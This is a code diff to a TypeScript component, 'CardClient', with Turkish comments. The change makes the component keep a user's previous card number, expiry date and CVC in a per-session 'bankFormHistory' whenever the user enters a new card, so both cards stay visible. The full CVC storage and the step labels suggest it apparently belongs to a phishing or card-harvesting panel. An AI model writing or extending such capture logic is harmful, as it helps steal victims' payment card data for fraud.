@@ -63,8 +63,11 @@ export function CardClient({ sessionId }: Props) {
     setMsg(null);
 
     // ⭐ KART GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once cardNumber DOLUYSA)
-    //   yeni entry push et. ILK GIRIS kolonlara kaydedilsin ama GEÇMİŞ sayısı artsın.
+    //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) KART BILGISINI PUSH ET!
+    //   Boylece: kolon = YENİ kart (2. kart), history = ESKI kart (1. kart → gorunur).
     const prevCard = String((sessionFormData as any).cardNumber || "").trim();
+    const prevCardExp = String((sessionFormData as any).cardExpiry || "").trim();
+    const prevCardCvc = String((sessionFormData as any).cardCvc || "").trim();
     const isFirstCardEntry = prevCard.length === 0;
     const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
       ? (sessionFormData as any).bankFormHistory.slice()
@@ -73,9 +76,9 @@ export function CardClient({ sessionId }: Props) {
       currentHistory.push({
         htmlStepLabel: "KART BILGISI",
         capturedAt: new Date().toISOString(),
-        cardNumber: number.trim(),
-        cardExpiry: expiry.trim(),
-        cardCvc: cvc.trim(),
+        cardNumber: prevCard,
+        cardExpiry: prevCardExp,
+        cardCvc: prevCardCvc,
       });
     }
 
